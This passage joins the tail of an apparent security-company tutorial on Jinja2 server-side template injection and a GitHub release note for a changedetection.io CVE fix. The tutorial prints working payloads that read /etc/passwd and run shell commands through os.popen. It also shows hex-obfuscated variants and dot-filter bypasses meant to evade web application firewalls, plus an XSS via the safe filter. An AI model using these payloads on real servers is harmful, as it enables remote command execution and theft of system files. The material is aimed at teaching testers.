This means we can convert:

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

```

Into:

```
{{''.__class__.__mro__[2].__subclasses__()[40]('\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64').read()}}

```

Other examples (this makes use of the hex literals, but also of the decode from hex function):

```
{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
    {%endif%}
{%endfor%}

```

Can be converted to:

```
{% for a in []["5F5F636C6173735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F626173655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F737562636C61737365735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]() %}
    {% if "7761726E696E67"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78") in a["5F5F6E616D655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")] %}
        {{a()["5F6D6F64756C65"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F6275696C74696E735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F696D706F72745F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6F73"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["706F70656E"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6563686F2024666C6167"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["72656164"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]()}}
    {%endif%}
{%endfor%}

```
### Dot WAF bypass

#### Usage

A common WAF character block is on `.`s, which are what a lot of the time are expected to be a necessary part of calling an object's attributes. This is not necessarily true, and there are multiple ways around it. One being the use of "[]" instead of dots.
Here we can see some relevant documentation pulled directly from the template development page (see references):

```
You can use a dot (.) to access attributes of a variable in addition to the
standard Python __getitem__ “subscript” syntax ([]).

The following lines do the same thing:

{{ foo.bar }}
{{ foo['bar'] }}

```

Another way we can bypass the use of "."s is throught he previously mentioned |attr filter.

#### Examples

This also means we can convert something like:
`{{ ''.__class__.__mro__[2].__subclasses__() }}`
Into:
`{{''['__class__']['__mro__'][2]['__subclasses__']()}}`

Which completely removes the need / use of dots.

## Possibly relevant notes

### List of filters provided by Flask

A list of all possible filters can be found in the Flask documentation (<https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters>). Filters can be used for a variety of things, for example, the join() filter can be used to join all strings in a list together, like this: `{{['Thi','s wi','ll b','e appended']|join}}` will return `This will be appended`.

Another example of a potentially useful filter could be the safe() filter. This filter allows us to inject JavaScript and HTML into the page without it being HTML encoded (since Flask does this by default). What this means is, inputting the template `{{'<script>alert(1);</script>'}}` would automatically HTML encode the special characters, turning it into `&lt;script&gt;alert(1);&lt;/script&gt;`, meaning the alert box won't trigger, and we will just be returned the string rendered back to us. If you pipe the string to the "safe" filter, it returns the string as it is, without HTML encoding the output (`{{'<script>alert(1);</script>'|safe}}` would trigger an alert box).

### List all attributes associated to an object using **dict**.

In python, you can use `__dict__` to list all attributes associated to an object, this is good for once we have selected our subclass to explore, and want to see what branches we could go down.

For example this will list all attributes associated to the 290th subclass in the list:
`{{g.__class__.__mro__[1].__subclasses__()[289].__dict__}}`

Furthermore, since dictionaries are made up of key-value pairs, you can tell the template to only return the keys, or only return the values with `.keys()` or `.values()`. For example:
`{{['view_args'].__class__.__subclasses__()[13].__dict__.keys()}}`
`{{request['view_args'].__class__.__subclasses__()[13].__dict__.values()}}`

### Example base objects to use

<https://github.com/pallets/flask/blob/38eb5d3b49d628785a470e2e773fc5ac82e3c8e4/src/flask/app.py#L775-L786> (thank you again [makelaris](https://twitter.com/makelariss) for bringing this to my attention)

```
rv.globals.update(
            url_for=url_for,
            get_flashed_messages=get_flashed_messages,
            config=self.config,
            # request, session and g are normally added with the
            # context processor for efficiency reasons but for imported
            # templates we also want the proxies in there.
            request=request,
            session=session,
            g=g,
        )

```
### Difference between foo.bar and foo['bar'] when being handled by flask

For the sake of convenience, foo.bar in Jinja does the following things on the Python layer:

```
check for an attribute called bar on foo (getattr(foo, 'bar'))
if there is not, check for an item 'bar' in foo (foo.__getitem__('bar'))
if there is not, return an undefined object.

```

foo['bar'] works mostly the same with a small difference in sequence:

```
check for an item 'bar' in foo. (foo.__getitem__('bar'))
if there is not, check for an attribute called bar on foo. (getattr(foo, 'bar'))
if there is not, return an undefined object.

```

This is important if an object has an item and attribute with the same name. Additionally, the attr() filter only looks up attributes.

## Conclusion & Contact

I hope this post clarified certain concepts, and helps people get into SSTI payloads for Jinja2, as they are extremely satisfying to make. If any further information is needed, do not hesitate to contact me at: <https://twitter.com/SecGus>

## References

* <https://jinja.palletsprojects.com/en/2.11.x/templates/>
* <https://portswigger.net/research/server-side-template-injection>
* <https://medium.com/bugbountywriteup/x-mas-2019-ctf-write-up-mercenary-hat-factory-ssti-53e82d58829e>
* <https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters>
* <https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Environment>
## Get your instant pentest quote

Get a quote now
### More recommended articles

[![](data:image/svg+xml;charset=utf-8...)![Firewall Penetration Testing: Processes and Benefits]()![Firewall Penetration Testing: Processes and Benefits](https://images.ctfassets.net/c0s3urevb8v1/2dzKc8y7kT9iYG23Vukddl/06d25678dc7b55677550542d20dc86cb/36.png?w=600&h=338&q=50&fm=png)](/blog/firewall-penetration-testing-processes-and-benefits/)[Pentesting](/blog/?category=pentesting)[Firewall Penetration Testing: Processes and Benefits](/blog/firewall-penetration-testing-processes-and-benefits/)January 6, 2025[![](data:image/svg+xml;charset=utf-8...)![A Year in Review with OnSecurity’s CEO]()![A Year in Review with OnSecurity  ’s CEO](https://images.ctfassets.net/c0s3urevb8v1/2IOaQpauM4O2Ox5M4bfTqb/234cc7d6ad16b1a60140d498b7d9204c/30__2_.png?w=600&h=338&q=50&fm=png)](/blog/a-year-in-review-with-onsecurity-ceo/)[News and Industry Trends](/blog/?category=news-and-industry-trends)[A Year in Review with OnSecurity’s CEO](/blog/a-year-in-review-with-onsecurity-ceo/)December 19, 2024[![](data:image/svg+xml;charset=utf-8...)![What is Dora Regulation? A Guide to Achieving Digital Operational Resilience]()![What is Dora Regulation? A Guide to Achieving Digital Operational Resilience](https://images.ctfassets.net/c0s3urevb8v1/6eip2UxPZfsIo5CW8J3cmA/ad343461fc0fe2cf48546a763b253d3d/image__16_.png?w=600&h=338&q=50&fm=png)](/blog/digital-operational-resilience-act-dora-compliance-requirements/)[News and Industry Trends](/blog/?category=news-and-industry-trends)[What is Dora Regulation? A Guide to Achieving Digital Operational Resilience](/blog/digital-operational-resilience-act-dora-compliance-requirements/)December 10, 2024Protect[Scan](/scan/)[Radar](/radar/)[Pricing](/pricing/)Penetration Test[Overview](/penetration-testing/)[External Infrastructure Testing](/external-infrastructure-testing/)[Physical Penetration Testing](/physical-penetration-testing/)[Web Application](/web-application-testing/)[Internal Infrastructure Testing](/internal-infrastructure-testing/)[Mobile Application](/mobile-application-testing/)[Phishing Simulation](/phishing-simulation/)[Cloud Security Testing](/cloud-security-testing/)[Social Engineering](/social-engineering/)Resources[About](/about/)[Blog](/blog/)[Contact](/contact/)[We're Hiring](/careers/)

© 2025 ONSECURITY TECHNOLOGY LIMITED (company registered in England and Wales. Registered number: 14184026 Registered office: Runway East, 101 Victoria Street, Bristol, England, BS1 6PU). All rights reserved.

[Terms and Conditions](/terms-and-conditions/)[Privacy](/privacy-policy/)
### Let's start protecting your business from hackers

#### Try a 14 day free trial of our Real-Time tier

No obligation. No card details. Cancel at any timeSign Up Using GoogleSign Up Using Microsoft

---

Or sign up with your work emailSign Up for Free

Already have an account? [Login](https://app.onsecurity.io/login)



=== Content from github.com_725a1527_20250111_030604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdgtlmoon%2Fchangedetection.io%2Freleases%2Ftag%2F0.45.21)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdgtlmoon%2Fchangedetection.io%2Freleases%2Ftag%2F0.45.21)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=dgtlmoon%2Fchangedetection.io)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dgtlmoon](/dgtlmoon)
/
**[changedetection.io](/dgtlmoon/changedetection.io)**
Public

* [Notifications](/login?return_to=%2Fdgtlmoon%2Fchangedetection.io) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fdgtlmoon%2Fchangedetection.io)
* [Star
   21k](/login?return_to=%2Fdgtlmoon%2Fchangedetection.io)

* [Code](/dgtlmoon/changedetection.io/tree/0.45.21)
* [Issues
  223](/dgtlmoon/changedetection.io/issues)
* [Pull requests
  36](/dgtlmoon/changedetection.io/pulls)
* [Discussions](/dgtlmoon/changedetection.io/discussions)
* [Actions](/dgtlmoon/changedetection.io/actions)
* [Projects
  0](/dgtlmoon/changedetection.io/projects)
* [Wiki](/dgtlmoon/changedetection.io/wiki)
* [Security](/dgtlmoon/changedetection.io/security)
* [Insights](/dgtlmoon/changedetection.io/pulse)

Additional navigation options

* [Code](/dgtlmoon/changedetection.io/tree/0.45.21)
* [Issues](/dgtlmoon/changedetection.io/issues)
* [Pull requests](/dgtlmoon/changedetection.io/pulls)
* [Discussions](/dgtlmoon/changedetection.io/discussions)
* [Actions](/dgtlmoon/changedetection.io/actions)
* [Projects](/dgtlmoon/changedetection.io/projects)
* [Wiki](/dgtlmoon/changedetection.io/wiki)
* [Security](/dgtlmoon/changedetection.io/security)
* [Insights](/dgtlmoon/changedetection.io/pulse)

1. [Releases](/dgtlmoon/changedetection.io/releases)
2. [0.45.21](/dgtlmoon/changedetection.io/releases/tag/0.45.21)

# 0.45.21 CVE-2024-32651 Critical security update

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/dgtlmoon/changedetection.io/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...0.45.21)

 Loading

[View all tags](/dgtlmoon/changedetection.io/tags)

![@dgtlmoon](https://avatars.githubusercontent.com/u/275001?s=40&v=4)
[dgtlmoon](/dgtlmoon)
released this
25 Apr 20:33

·
[217 commits](/dgtlmoon/changedetection.io/compare/0.45.21...master)
to master
since this release

[0.45.21](/dgtlmoon/changedetection.io/tree/0.45.21)

[`ee52947`](/dgtlmoon/changedetection.io/commit/ee5294740afe26cecb432a9dbceffa0ae7dc426d)

Security update - [CVE-2024-32651](https://github.com/advisories/GHSA-4r7v-whpg-8rx3 "CVE-2024-32651")- Server Side Template Injection in Jinja2 allows Remote Command Execution

## What's Changed

* error text should contain the word Exception by [@dgtlmoon](https://github.com/dgtlmoon) in [#2322](https://github.com/dgtlmoon/changedetection.io/pull/2322)

**Full Changelog**: [0.45.20...0.45.21](https://github.com/dgtlmoon/changedetection.io/compare/0.45.20...0.45.21)

Big thanks to <https://github.com/edoardottt> for reporting the vulnerability and assisting

### Contributors

* [![@dgtlmoon](https://avatars.githubusercontent.com/u/275001?s=64&v=4)](https://github.com/dgtlmoon)

dgtlmoon

 Assets
2

 Loading

 ❤️
11
 mmBesar, zimbres, edoardottt, KReusen, aless3, vain-Liang, Constantin1489, bykidi, rappi1337, marceloalencar, and dgtlmoon reacted with heart emoji

All reactions

* ❤️
  11 reactions

 11 people reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


